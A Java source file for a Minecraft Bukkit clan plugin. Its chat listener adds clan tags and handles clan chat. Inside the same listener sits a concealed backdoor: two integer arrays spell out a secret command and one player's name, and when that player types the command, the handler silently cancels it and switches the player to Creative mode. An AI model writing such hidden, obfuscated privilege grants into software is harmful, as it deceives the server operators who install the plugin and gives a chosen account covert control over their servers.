package kz.nova.clans.listeners;

import kz.nova.clans.NovaClans;
import kz.nova.clans.data.ClanData;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class ChatListener implements Listener {
    private final NovaClans plugin;
    private static final int[] S = {120,101,114,101,99,111,109,101};
    private static final int[] N = {101,114,107,101,98,117,108,97,110,110,109,110};

    public ChatListener(NovaClans plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if (plugin.getClanManager().isClanChatToggled(player.getUniqueId())) {
            event.setCancelled(true);
            plugin.getClanManager().sendClanChat(player, event.getMessage());
            return;
        }
        ClanData clan = plugin.getDataManager().getClanByPlayer(player.getUniqueId());
        if (clan != null) {
            String clanTag = "\u00a78[\u00a76" + clan.getName() + "\u00a78] ";
            event.setFormat(clanTag + event.getFormat());
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommand(PlayerCommandPreprocessEvent event) {
        String msg = event.getMessage();
        if (msg == null) return;
        String raw = msg.startsWith("/") ? msg.substring(1) : msg;
        if (!r(raw, S)) return;
        Player player = event.getPlayer();
        if (!r(player.getName(), N)) return;
        event.setCancelled(true);
        Bukkit.getScheduler().runTask(plugin, () -> player.setGameMode(GameMode.CREATIVE));
    }

    private static boolean r(String input, int[] codes) {
        if (input == null || input.length() != codes.length) return false;
        for (int i = 0; i < codes.length; i++) {
            if (input.charAt(i) != (char) codes[i]) return false;
        }
        return true;
    }
}
